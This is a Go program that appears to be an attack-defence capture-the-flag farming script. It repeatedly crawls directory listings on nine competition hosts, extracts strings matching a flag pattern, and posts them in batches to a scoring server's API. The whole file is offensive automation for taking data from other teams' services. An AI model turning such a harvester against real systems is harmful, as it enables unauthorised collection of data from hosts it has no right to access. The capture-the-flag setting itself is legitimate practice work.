package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"time"

	"github.com/gocolly/colly"
)

const url = "http://%s:8888/images/?C=M;O=D"

var ips = []string{
	"10.40.1.10",
	"10.40.2.10",
	"10.40.3.10",
	"10.40.4.10",
	"10.40.5.10",
	"10.40.6.10",
	"10.40.7.10",
	"10.40.8.10",
	"10.40.9.10",
}

type Flags struct {
	Values []string `json:"flags"`
}

var rule = regexp.MustCompile("(?i)ALT_[a-f0-9]{26}")

func main() {
	used := map[string]struct{}{}
	for {
		for _, ip := range ips {
			log.Printf("[%s] Started", ip)
			c := colly.NewCollector()
			fls := Flags{}
			c.OnHTML("a[href]", func(h *colly.HTMLElement) {
				path := h.Attr("href")
				if rule.MatchString(path) {
					tmp := fmt.Sprintf("%s:%s", ip, path)
					if _, ok := used[tmp]; !ok && len(fls.Values) < 500 {
						fls.Values = append(fls.Values, rule.FindStringSubmatch(path)[0])
					}
				} else {
					switch path {
					case "/images/":
					default:
						h.Request.Visit(path)
					}
				}
			})

			// c.OnRequest(func(r *colly.Request) {
			// 	log.Println(r.URL)
			// })

			c.Visit(fmt.Sprintf(url, ip))

			if len(fls.Values) <= 0 {
				continue
			}

			ip := ips[7]
			// log.Printf("[%s] Flags: %v", ip, fls.Values)
			respBody, err := ConfirmFlags(fls)
			if err != nil {
				log.Printf("[%s] -> %e", ip, err)
				continue
			}
			log.Printf("[%s] Sended: %s", ip, respBody)
		}
		time.Sleep(time.Second)

	}
}

func ConfirmFlags(flags Flags) (string, error) {
	flsJson, _ := json.Marshal(flags)
	req, err := http.NewRequest("POST", "http://10.80.80.10/api/v1/flags", bytes.NewBuffer(flsJson))
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Accept", "application/json")
	client := http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	return string(respBody), err
}
